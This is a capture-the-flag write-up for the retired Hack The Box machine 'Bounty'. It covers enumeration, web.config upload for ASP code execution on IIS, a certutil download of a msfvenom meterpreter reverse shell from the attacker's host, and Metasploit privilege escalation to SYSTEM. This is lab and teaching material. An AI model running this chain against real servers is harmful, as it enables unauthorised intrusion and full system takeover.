# Bounty

This is the write-up for the box Bounty that got retired at the 27th October 2018.
My IP address was 10.10.14.12 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.93    bounty.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/bounty.nmap 10.10.10.93
```

```markdown
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Checking HTTP (Port 80)

On the web page is an image of "Merlin the Wizard" and nothing interesting in the HTML source code.
Lets search for hidden _aspx_ files with **Gobuster** as this is an IIS Windows server:
```markdown
gobuster -u http://10.10.10.93 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx
```

It finds the path _/uploadedFiles_ and _/transfer.aspx_ where it is possible to upload files.
When uploading an _aspx_ file, it gets blocked but _jpg_ gets uploaded successfully.

Lets send the request to an HTTP proxy like **Burpsuite** to analyze it further.
By creating a list of extensions, we can fuzz which extensions are allowed:
```markdown
Send request to **Intruder** --> Add "§" to the _filename_ parameter --> Set created list of extensions as payload in the _Payload Options_ --> Start Attack
```

![Burpsuite Intruder results](https://kyuu-ji.github.io/htb-write-up/bounty/bounty_web-1.png)

All of the files response back with _HTTP code 200 OK_ but the only one that has a different length is the _config_ extension.
This different length is because it responses with  _"File uploaded successfully"_.

It is possible to [upload a web.config file to gain RCE](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/) when adding the ASPX code at the end of the file.
Lets copy the code and upload it to the box:
```markdown
<?xml version="1.0" encoding="UTF-8"?>
(...)
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

Files probably get uploaded to the _/uploadedFiles_ directory:
```markdown
http://10.10.10.93/UploadedFiles/web.config
```

There it shows _"3"_ which means it executed the code in the _web.config_ file and did math, so we got command execution and can upload files by modifying the code.

### Exploiting the web service

Creating a payload with **Msfvenom**:
```markdown
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=9002 -f exe -o msfshell.exe
```

Starting the listener on **Metasploit**:
```markdown
msf5 > use exploit/multi/handler

msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST tun0
msf5 exploit(multi/handler) > set LPORT 9002

msf5 exploit(multi/handler) > run
```

To upload files the Windows binary **certutil** will be used:
```markdown
<?xml version="1.0" encoding="UTF-8"?>
(...)
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("certutil -urlcache -split -f http://10.10.14.12:8000/msfshell.exe C:\\users\\public\\msfshell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->
```

If the upload is successful, we execute _msfshell.exe_:
```markdown
(...)
Set cmd = rs.Exec("cmd /c C:\users\public\msfshell.exe")
(...)
```

After executing the binary the listener in Metasploit will start a **meterpreter** session. When going into a `shell` and running `whoami`, it shows that this user is _merlin_.

## Privilege Escalation

The command `systeminfo` shows that there are no hotfixes installed, which means that it is possible to exploit any vulnerability.
To check which vulnerability to exploit, there is the _local_exploit_suggester_ from Metasploit:
```markdown
msf5 > use post/multi/recon/local_exploit_suggester

msf5 post(multi/recon/local_exploit_suggester) > set session 1

msf5 post(multi/recon/local_exploit_suggester) > run
```

There are five exploits that can be used to escalate the privileges and I will use **ms10_092_schelevator**:
```markdown
msf5 > use exploit/windows/local/ms10_092_schelevator

msf5 exploit(windows/local/ms10_092_schelevator) > set LHOST tun0
msf5 exploit(windows/local/ms10_092_schelevator) > set session 1

msf5 exploit(windows/local/ms10_092_schelevator) > run
```

After the exploit is done, it starts a session as _NT Authority\SYSTEM_!
